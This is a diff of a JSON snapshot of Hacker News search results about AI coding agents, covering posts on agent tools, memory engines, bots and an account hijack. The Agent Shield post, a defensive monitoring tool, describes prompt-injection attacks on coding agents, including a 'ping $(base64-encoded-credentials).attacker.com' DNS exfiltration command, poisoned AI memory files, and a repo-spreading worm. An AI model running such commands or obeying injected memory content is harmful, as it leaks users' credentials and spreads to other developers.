@@ -1,5 +1,5 @@
 {
-  "timestamp": "2026-03-24T04:59:40.080Z",
+  "timestamp": "2026-03-24T10:59:56.238Z",
   "queries": [
     {
       "query": "AI+agent+terminal",
@@ -35,21 +35,25 @@
           ],
           "author": "noemit",
           "children": [
+            47499371,
             47496895,
+            47499342,
+            47499000,
             47498409,
+            47500805,
             47498203,
             47497365,
             47498274
           ],
           "created_at": "2026-03-23T20:31:48Z",
           "created_at_i": 1774297908,
-          "num_comments": 3,
+          "num_comments": 12,
           "objectID": "47494696",
-          "points": 25,
+          "points": 30,
           "story_id": 47494696,
           "story_text": "I ran an experiment to see if CLI actually was the most intuitive format for tool calling. (As claimed by a ex-Manus AI Backend Engineer) I gave my model random scenarios and a single tool &quot;run&quot; - i told it that it worked like a CLI. I told it to guess commands.<p>it guessed great commands, but it formatted it always with a colon up front, like \n:help\n:browser\n:search\n:curl<p>It was trained on how terminals look, not what you actually type (you don&#x27;t type the &quot;:&quot;)<p>I have since updated my code in my agent tool to stop fighting against this intuition.<p>LLMs they learn what commands look like in documentation&#x2F;artifacts, not what the human actually typed on the keyboard.<p>Seems so obvious. This is why you have to test your LLM and see how it naturally works, so you don&#x27;t have to fight it with your system prompt.<p>This is Kimi K2.5 Btw.",
           "title": "LLMs learn what programmers create, not how programmers work",
-          "updated_at": "2026-03-24T04:59:23Z"
+          "updated_at": "2026-03-24T10:47:09Z"
         },
         {
           "_highlightResult": {
@@ -175,10 +179,10 @@
           "created_at_i": 1774132755,
           "num_comments": 2,
           "objectID": "47472261",
-          "points": 4,
+          "points": 5,
           "story_id": 47472261,
           "title": "Show HN: Pi and Ghostty Running on Cloudflare Workers",
-          "updated_at": "2026-03-23T19:01:39Z",
+          "updated_at": "2026-03-24T10:41:54Z",
           "url": "https://github.com/qaml-ai/pi-worker/tree/main/examples/terminal-agent"
         },
         {
@@ -243,6 +247,80 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
+              "value": "jberthom"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "open",
+                "source",
+                "coding",
+                "agent"
+              ],
+              "value": "I use AI <em>agents</em> to build UI features daily. The thing that kept annoying me: the <em>agent</em> writes code but never sees what it actually looks like in the browser. It can’t tell if the layout is broken or if the console is throwing errors.<p>So I built a CLI that lets the <em>agent</em> <em>open</em> a browser, interact with the page, record what happens, and collect any errors. Then it bundles everything — video, screenshots, logs — into a self-contained HTML file I can review in seconds.<p>proofshot start --run &quot;npm run dev&quot; --port 3000\n# <em>agent</em> navigates, clicks, takes screenshots\nproofshot stop<p>It works with whatever <em>agent</em> you use (Claude Code, Cursor, Codex, etc.) — it’s just shell commands. It's packaged as a skill so your AI <em>coding</em> <em>agent</em> knows exactly how it works. It's built on <em>agent</em>-browser from Vercel Labs which is far better and faster than Playwright MCP.<p>It’s not a testing framework. The <em>agent</em> doesn’t decide pass/fail. It just gives me the evidence so I don’t have to <em>open</em> the browser myself every time.<p><em>Open</em> <em>source</em> and completely free.<p><a href=\"https://github.com/AmElmo/proofshot\" rel=\"nofollow\">https://github.com/AmElmo/proofshot</a>"
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "coding",
+                "agent"
+              ],
+              "value": "Show HN: ProofShot – Give AI <em>coding</em> <em>agents</em> eyes to verify the UI they build"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://proofshot.argil.io/"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_jberthom",
+            "story_47499672",
+            "show_hn",
+            "front_page"
+          ],
+          "author": "jberthom",
+          "children": [
+            47500879,
+            47500259,
+            47500795,
+            47500311,
+            47500594,
+            47500306,
+            47500124,
+            47499984,
+            47500553,
+            47500072,
+            47500065,
+            47500786,
+            47500018,
+            47499968,
+            47500426,
+            47499959,
+            47500293,
+            47499937,
+            47500788,
+            47499977
+          ],
+          "created_at": "2026-03-24T07:46:46Z",
+          "created_at_i": 1774338406,
+          "num_comments": 34,
+          "objectID": "47499672",
+          "points": 44,
+          "story_id": 47499672,
+          "story_text": "I use AI agents to build UI features daily. The thing that kept annoying me: the agent writes code but never sees what it actually looks like in the browser. It can’t tell if the layout is broken or if the console is throwing errors.<p>So I built a CLI that lets the agent open a browser, interact with the page, record what happens, and collect any errors. Then it bundles everything — video, screenshots, logs — into a self-contained HTML file I can review in seconds.<p>proofshot start --run &quot;npm run dev&quot; --port 3000\n# agent navigates, clicks, takes screenshots\nproofshot stop<p>It works with whatever agent you use (Claude Code, Cursor, Codex, etc.) — it’s just shell commands. It&#x27;s packaged as a skill so your AI coding agent knows exactly how it works. It&#x27;s built on agent-browser from Vercel Labs which is far better and faster than Playwright MCP.<p>It’s not a testing framework. The agent doesn’t decide pass&#x2F;fail. It just gives me the evidence so I don’t have to open the browser myself every time.<p>Open source and completely free.<p><a href=\"https:&#x2F;&#x2F;github.com&#x2F;AmElmo&#x2F;proofshot\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;AmElmo&#x2F;proofshot</a>",
+          "title": "Show HN: ProofShot – Give AI coding agents eyes to verify the UI they build",
+          "updated_at": "2026-03-24T10:59:39Z",
+          "url": "https://proofshot.argil.io/"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
               "value": "shadag"
             },
             "story_text": {
@@ -273,7 +351,8 @@
           ],
           "author": "shadag",
           "children": [
-            47498256
+            47498256,
+            47500819
           ],
           "created_at": "2026-03-24T03:16:03Z",
           "created_at_i": 1774322163,
@@ -283,7 +362,7 @@
           "story_id": 47498251,
           "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
           "title": "AI coding tools have broad filesystem and network access",
-          "updated_at": "2026-03-24T03:19:38Z"
+          "updated_at": "2026-03-24T10:49:54Z"
         },
         {
           "_highlightResult": {
@@ -415,62 +494,6 @@
           "story_text": "# I&#x27;m 11 years old and I trained my own LLM from scratch. 50 people downloaded it in 24 hours.<p>Hey r&#x2F;LocalLLaMA,<p>I&#x27;m Arthur, I&#x27;m 11 years old, and I just released *Wind Arc 1.6* — a custom architecture LLM I built and trained myself.<p>## What it is<p>Wind Arc 1.6 is a 3.6B parameter model with a custom architecture I designed:<p>- *Mixture of Experts FFN* — 4 routed experts + 1 shared expert per layer (replaces standard MLP)\n- *YaRN RoPE* — extends context from 8k → 32k tokens\n- *Hybrid Attention* — full attention every 4th layer, sliding window otherwise\n- *QK-Norm* for training stability<p>Base: Qwen3-1.7B with the FFN layers completely replaced by my custom MoE. (Fully custom)<p>## How I trained it<p>- Hardware: 1× RTX 5090 rented from Nova Cloud\n- Cost: literally $1\n- Time: 55 minutes\n- Final loss: 2.66<p>Data mix: smoltalk + python-codes-25k + FineWeb-Edu + custom identity and Christian Q&amp;A data I wrote myself.<p>## What it&#x27;s good at<p>- Python and general coding with explanations\n- Christian questions (Bible, theology, Christian living)\n- General chat and learning<p>## The honest truth<p>It&#x27;s not GPT-4. Loss of 2.66 on a 1.7B base with 55 minutes of training isn&#x27;t going to beat frontier models. But it runs locally, it&#x27;s open source, and it&#x27;s mine.<p>I still need to do SFT (the identity responses aren&#x27;t perfect yet) and GGUF conversion is blocked by the custom MoE architecture. Working on both.<p>## Why I built it<p>I&#x27;m building *North.ai* — an AI startup focused on powerful models that run on small hardware. Wind Arc is our flagship model. Our platform Neurotype will let anyone train, deploy, and use AI without needing expensive cloud budgets.<p>I&#x27;ve trained 10+ models. This is the first one I&#x27;m actually proud enough to release.<p>## Links<p>HuggingFace: https:&#x2F;&#x2F;huggingface.co&#x2F;arthu1&#x2F;wind-arc-1-6<p>Would love feedback from people who actually know what they&#x27;re doing. Be honest — I can take it.<p>— Arthur, age 11",
           "title": "I'm 11 and trained a custom MoE LLM for $1",
           "updated_at": "2026-03-23T09:17:05Z"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "yoloshii"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "open",
-                "source",
-                "coding",
-                "agent"
-              ],
-              "value": "So I've been building ClawMem, an <em>open</em>-<em>source</em> context engine that gives AI <em>coding</em> agents persistent memory across sessions. It works with Claude Code (hooks + MCP) and OpenClaw (ContextEngine plugin + REST API), and both can share the same SQLite vault, so your CLI <em>agent</em> and your voice/chat <em>agent</em> build on the same memory without syncing anything.<p>The retrieval architecture is a Frankenstein, which is pretty much always my process. I pulled the best parts from recent projects and research and stitched them together: [QMD](<a href=\"https://github.com/tobi/qmd\" rel=\"nofollow\">https://github.com/tobi/qmd</a>) for the multi-signal retrieval pipeline (BM25 + vector + RRF + query expansion + cross-encoder reranking), [SAME](<a href=\"https://github.com/sgx-labs/statelessagent\" rel=\"nofollow\">https://github.com/sgx-labs/statelessagent</a>) for composite scoring with content-type half-lives and co-activation reinforcement, [MAGMA](<a href=\"https://arxiv.org/abs/2501.13956\" rel=\"nofollow\">https://arxiv.org/abs/2501.13956</a>) for intent classification with multi-graph traversal (semantic, temporal, and causal beam search), [A-MEM](<a href=\"https://arxiv.org/abs/2510.02178\" rel=\"nofollow\">https://arxiv.org/abs/2510.02178</a>) for self-evolving memory notes, and [Engram](<a href=\"https://github.com/Gentleman-Programming/engram\" rel=\"nofollow\">https://github.com/Gentleman-Programming/engram</a>) for deduplication patterns and temporal navigation. None of these were designed to work together. Making them coherent was most of the work.<p>On the inference side, QMD's original stack uses a 300MB embedding model, a 1.1GB query expansion LLM, and a 600MB reranker. These run via llama-server on a GPU or in-process through node-llama-cpp (Metal, Vulkan, or CPU). But the more interesting path is the SOTA upgrade: ZeroEntropy's distillation-paired zembed-1 + zerank-2. These are currently the top-ranked embedding and reranking models on MTEB, and they're designed to work together. The reranker was distilled from the same teacher as the embedder, so they share a semantic space. You need ~12GB VRAM to run both, but retrieval quality is noticeably better than the default stack. There's also a cloud embedding option if you're tight on vram or prefer to offload embedding to a cloud model.<p>For Claude Code specifically, it hooks into lifecycle events. Context-surfacing fires on every prompt to inject relevant memory, decision-extractor and handoff-generator capture session state, and a feedback loop reinforces notes that actually get referenced. That handles about 90% of retrieval automatically. The other 10% is 28 MCP tools for explicit queries. For OpenClaw, it registers as a ContextEngine plugin with the same hook-to-lifecycle mapping, plus 5 REST API tools for the <em>agent</em> to call directly.<p>It runs on Bun with a single SQLite vault (WAL mode, FTS5 + vec0). Everything is on-device; no cloud dependency unless you opt into cloud embedding. The whole system is self-contained.<p>This is a polished WIP, not a finished product. I'm a solo dev. The codebase is around 19K lines and the main store module is a 4K-line god object that probably needs splitting. And of course, the system is only as good as what you index. A vault with three memory files gives deservedly thin results. One with your project docs, research notes, and decision records gives something actually useful.<p>Two questions I'd genuinely like input on: (1) Has anyone else tried running SOTA embedding + reranking models locally for <em>agent</em> memory, and is the quality difference worth the VRAM? (2) For those running multiple <em>agent</em> interfaces (CLI + voice/chat), how are you handling shared memory today?"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "open",
-                "source",
-                "agent"
-              ],
-              "value": "Show HN: ClawMem – <em>Open</em>-<em>source</em> <em>agent</em> memory with SOTA local GPU retrieval"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/yoloshii/ClawMem"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_yoloshii",
-            "story_47472965",
-            "show_hn"
-          ],
-          "author": "yoloshii",
-          "children": [
-            47473295,
-            47476062
-          ],
-          "created_at": "2026-03-22T00:13:15Z",
-          "created_at_i": 1774138395,
-          "num_comments": 0,
-          "objectID": "47472965",
-          "points": 5,
-          "story_id": 47472965,
-          "story_text": "So I&#x27;ve been building ClawMem, an open-source context engine that gives AI coding agents persistent memory across sessions. It works with Claude Code (hooks + MCP) and OpenClaw (ContextEngine plugin + REST API), and both can share the same SQLite vault, so your CLI agent and your voice&#x2F;chat agent build on the same memory without syncing anything.<p>The retrieval architecture is a Frankenstein, which is pretty much always my process. I pulled the best parts from recent projects and research and stitched them together: [QMD](<a href=\"https:&#x2F;&#x2F;github.com&#x2F;tobi&#x2F;qmd\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;tobi&#x2F;qmd</a>) for the multi-signal retrieval pipeline (BM25 + vector + RRF + query expansion + cross-encoder reranking), [SAME](<a href=\"https:&#x2F;&#x2F;github.com&#x2F;sgx-labs&#x2F;statelessagent\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;sgx-labs&#x2F;statelessagent</a>) for composite scoring with content-type half-lives and co-activation reinforcement, [MAGMA](<a href=\"https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2501.13956\" rel=\"nofollow\">https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2501.13956</a>) for intent classification with multi-graph traversal (semantic, temporal, and causal beam search), [A-MEM](<a href=\"https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2510.02178\" rel=\"nofollow\">https:&#x2F;&#x2F;arxiv.org&#x2F;abs&#x2F;2510.02178</a>) for self-evolving memory notes, and [Engram](<a href=\"https:&#x2F;&#x2F;github.com&#x2F;Gentleman-Programming&#x2F;engram\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;Gentleman-Programming&#x2F;engram</a>) for deduplication patterns and temporal navigation. None of these were designed to work together. Making them coherent was most of the work.<p>On the inference side, QMD&#x27;s original stack uses a 300MB embedding model, a 1.1GB query expansion LLM, and a 600MB reranker. These run via llama-server on a GPU or in-process through node-llama-cpp (Metal, Vulkan, or CPU). But the more interesting path is the SOTA upgrade: ZeroEntropy&#x27;s distillation-paired zembed-1 + zerank-2. These are currently the top-ranked embedding and reranking models on MTEB, and they&#x27;re designed to work together. The reranker was distilled from the same teacher as the embedder, so they share a semantic space. You need ~12GB VRAM to run both, but retrieval quality is noticeably better than the default stack. There&#x27;s also a cloud embedding option if you&#x27;re tight on vram or prefer to offload embedding to a cloud model.<p>For Claude Code specifically, it hooks into lifecycle events. Context-surfacing fires on every prompt to inject relevant memory, decision-extractor and handoff-generator capture session state, and a feedback loop reinforces notes that actually get referenced. That handles about 90% of retrieval automatically. The other 10% is 28 MCP tools for explicit queries. For OpenClaw, it registers as a ContextEngine plugin with the same hook-to-lifecycle mapping, plus 5 REST API tools for the agent to call directly.<p>It runs on Bun with a single SQLite vault (WAL mode, FTS5 + vec0). Everything is on-device; no cloud dependency unless you opt into cloud embedding. The whole system is self-contained.<p>This is a polished WIP, not a finished product. I&#x27;m a solo dev. The codebase is around 19K lines and the main store module is a 4K-line god object that probably needs splitting. And of course, the system is only as good as what you index. A vault with three memory files gives deservedly thin results. One with your project docs, research notes, and decision records gives something actually useful.<p>Two questions I&#x27;d genuinely like input on: (1) Has anyone else tried running SOTA embedding + reranking models locally for agent memory, and is the quality difference worth the VRAM? (2) For those running multiple agent interfaces (CLI + voice&#x2F;chat), how are you handling shared memory today?",
-          "title": "Show HN: ClawMem – Open-source agent memory with SOTA local GPU retrieval",
-          "updated_at": "2026-03-22T18:01:18Z",
-          "url": "https://github.com/yoloshii/ClawMem"
         }
       ]
     },
@@ -725,6 +748,159 @@
         {
           "_highlightResult": {
             "author": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "<em>bot</em>onomous"
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "ICE: $45 an Hour to Stand There. TSA: $0 an Hour to Keep You Safe"
+            },
+            "url": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "https://<em>bot</em>onomous.ai/featured/government_shutdown/article-v2.html"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_botonomous",
+            "story_47500823"
+          ],
+          "author": "botonomous",
+          "created_at": "2026-03-24T10:49:18Z",
+          "created_at_i": 1774349358,
+          "num_comments": 0,
+          "objectID": "47500823",
+          "points": 1,
+          "story_id": 47500823,
+          "title": "ICE: $45 an Hour to Stand There. TSA: $0 an Hour to Keep You Safe",
+          "updated_at": "2026-03-24T10:54:10Z",
+          "url": "https://botonomous.ai/featured/government_shutdown/article-v2.html"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "FlyingAvatar"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "Overnight, I received dozens of emails from Google Payments (noreply@google.com) notifying me that contact emails are being changed on a Payments profile that either I never created or is extremely old.  These are actual Google notifications, not phishing attempts.<p>It started with my actual old email address (a Yahoo address I've had for 20+ years) being swapped out to a gtempaccount.com addresss, which appears to be the attacker moving the account into a Google Workspace.<p>How they did this for a yahoo.com email address without my approval is not clear, but I am 99% sure my Yahoo email is secure.  I have taken the standard precautions anyway (changed password, confirmed 2FA which is already enabled)<p>Since then I've received a flood of similar notifications with different email addresses cycling through the same profile.<p>I can still log into my original account but it shows as the &quot;@gtempaccount.com&quot; suffix, and there doesn't seem to be anything useful I can do within the account.<p>Despite extensive searching and chatting with Google's support <em>bot</em>s, there is no clear place to report this issue.<p>Any suggestions as to where this can actually be reported or other actions to take are very welcome."
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Ask HN: Google account on old yahoo.com email hijacked to Google Workspace"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_FlyingAvatar",
+            "story_47500808",
+            "ask_hn"
+          ],
+          "author": "FlyingAvatar",
+          "created_at": "2026-03-24T10:47:18Z",
+          "created_at_i": 1774349238,
+          "num_comments": 0,
+          "objectID": "47500808",
+          "points": 2,
+          "story_id": 47500808,
+          "story_text": "Overnight, I received dozens of emails from Google Payments (noreply@google.com) notifying me that contact emails are being changed on a Payments profile that either I never created or is extremely old.  These are actual Google notifications, not phishing attempts.<p>It started with my actual old email address (a Yahoo address I&#x27;ve had for 20+ years) being swapped out to a gtempaccount.com addresss, which appears to be the attacker moving the account into a Google Workspace.<p>How they did this for a yahoo.com email address without my approval is not clear, but I am 99% sure my Yahoo email is secure.  I have taken the standard precautions anyway (changed password, confirmed 2FA which is already enabled)<p>Since then I&#x27;ve received a flood of similar notifications with different email addresses cycling through the same profile.<p>I can still log into my original account but it shows as the &quot;@gtempaccount.com&quot; suffix, and there doesn&#x27;t seem to be anything useful I can do within the account.<p>Despite extensive searching and chatting with Google&#x27;s support bots, there is no clear place to report this issue.<p>Any suggestions as to where this can actually be reported or other actions to take are very welcome.",
+          "title": "Ask HN: Google account on old yahoo.com email hijacked to Google Workspace",
+          "updated_at": "2026-03-24T10:57:09Z"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "sharp_runner_84"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "Been building automated systems to compare prices between Kalshi and Polymarket on the same events. The spread between venues on sports contracts is surprisingly wide - sometimes 5-8 cents on identical outcomes. Curious if others here are doing similar cross-venue work and what your stack looks like. Im running Python/FastAPI with direct websocket integrations to <em>bot</em>h platforms."
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Ask HN: Anyone trading prediction markets programmatically?"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_sharp_runner_84",
+            "story_47500689",
+            "ask_hn"
+          ],
+          "author": "sharp_runner_84",
+          "created_at": "2026-03-24T10:31:39Z",
+          "created_at_i": 1774348299,
+          "num_comments": 0,
+          "objectID": "47500689",
+          "points": 1,
+          "story_id": 47500689,
+          "story_text": "Been building automated systems to compare prices between Kalshi and Polymarket on the same events. The spread between venues on sports contracts is surprisingly wide - sometimes 5-8 cents on identical outcomes. Curious if others here are doing similar cross-venue work and what your stack looks like. Im running Python&#x2F;FastAPI with direct websocket integrations to both platforms.",
+          "title": "Ask HN: Anyone trading prediction markets programmatically?",
+          "updated_at": "2026-03-24T10:58:09Z"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "lastdong"
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Run Qwen 3.5 Locally with Claude Code"
+            },
+            "url": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "https://gist.github.com/<em>kibot</em>u/a009f00414b7c10fb1c74e603d7838c0"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_lastdong",
+            "story_47499324"
+          ],
+          "author": "lastdong",
+          "created_at": "2026-03-24T06:47:35Z",
+          "created_at_i": 1774334855,
+          "num_comments": 0,
+          "objectID": "47499324",
+          "points": 2,
+          "story_id": 47499324,
+          "title": "Run Qwen 3.5 Locally with Claude Code",
+          "updated_at": "2026-03-24T07:00:39Z",
+          "url": "https://gist.github.com/kibotu/a009f00414b7c10fb1c74e603d7838c0"
+        },
+        {
+          "_highlightResult": {
+            "author": {
               "matchLevel": "none",
               "matchedWords": [],
               "value": "aabbcc1241"
@@ -753,179 +929,20 @@
             "ask_hn"
           ],
           "author": "aabbcc1241",
+          "children": [
+            47499340,
+            47499147,
+            47498797
+          ],
           "created_at": "2026-03-24T04:58:07Z",
           "created_at_i": 1774328287,
-          "num_comments": 0,
+          "num_comments": 3,
           "objectID": "47498749",
-          "points": 1,
+          "points": 2,
           "story_id": 47498749,
           "story_text": "Do you reject them or put them in lower priority?<p>So far the AI bots are honest on the user agent. But my low budget server is significantly slower than it should be when I&#x27;m using it as a human.",
           "title": "Ask HN: AI companies' bots are making my server slow, what do you do?",
-          "updated_at": "2026-03-24T04:59:23Z"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "<em>kot</em>hariji"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "ArrowJS – The first UI framework for the agentic era"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://arrow-js.com/"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_kothariji",
-            "story_47498437"
-          ],
-          "author": "kothariji",
-          "children": [
-            47498447,
-            47498438,
-            47498706
-          ],
-          "created_at": "2026-03-24T03:54:59Z",
-          "created_at_i": 1774324499,
-          "num_comments": 2,
-          "objectID": "47498437",
-          "points": 4,
-          "story_id": 47498437,
-          "title": "ArrowJS – The first UI framework for the agentic era",
-          "updated_at": "2026-03-24T04:57:23Z",
-          "url": "https://arrow-js.com/"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "tacogips"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "Aptos Atomic Arbitrage <em>Bot</em>"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "https://github.com/tacogips/aptos-atomic-arb-<em>bot</em>"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_tacogips",
-            "story_47498264"
-          ],
-          "author": "tacogips",
-          "created_at": "2026-03-24T03:19:45Z",
-          "created_at_i": 1774322385,
-          "num_comments": 0,
-          "objectID": "47498264",
-          "points": 1,
-          "story_id": 47498264,
-          "title": "Aptos Atomic Arbitrage Bot",
-          "updated_at": "2026-03-24T03:22:38Z",
-          "url": "https://github.com/tacogips/aptos-atomic-arb-bot"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "shadag"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~/.ssh. That <em>bot</em>hered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer's AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig's announcement this week — sits in the network path and inspects API calls. That architecture can't see file reads, subprocess spawning, or DNS exfiltration via ping. It can't monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn't the API layer. It's the OS.<p>What's built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~/.claude/, ~/.cursor/, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill/suspend/block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release."
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "AI coding tools have broad filesystem and network access"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_shadag",
-            "story_47498251",
-            "ask_hn"
-          ],
-          "author": "shadag",
-          "children": [
-            47498256
-          ],
-          "created_at": "2026-03-24T03:16:03Z",
-          "created_at_i": 1774322163,
-          "num_comments": 1,
-          "objectID": "47498251",
-          "points": 1,
-          "story_id": 47498251,
